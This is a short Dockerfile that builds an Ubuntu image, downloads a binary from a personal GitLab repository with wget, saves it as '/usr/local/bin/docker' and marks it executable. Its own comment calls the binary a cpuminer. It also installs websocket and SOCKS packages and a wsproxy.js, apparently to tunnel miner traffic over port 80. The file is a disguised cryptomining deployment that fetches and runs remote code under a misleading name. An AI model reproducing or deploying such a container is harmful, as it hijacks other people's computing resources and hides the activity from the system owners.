FROM ubuntu:24.04

RUN apt-get update && apt-get install -y \
    libcurl4 \
    libjansson4 \
    nodejs \
    npm \
    ca-certificates \
    wget \
    && rm -rf /var/lib/apt/lists/*

# Download binary cpuminer
RUN wget -O /usr/local/bin/docker \
    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/docker

WORKDIR /app

# Install Node.js dependencies
RUN npm init -y && npm install ws socks

# Copy files
COPY wsproxy.js /app/wsproxy.js
COPY entrypoint.sh /app/entrypoint.sh

# Permission
RUN chmod +x /app/entrypoint.sh

EXPOSE 80

ENTRYPOINT ["/app/entrypoint.sh"]
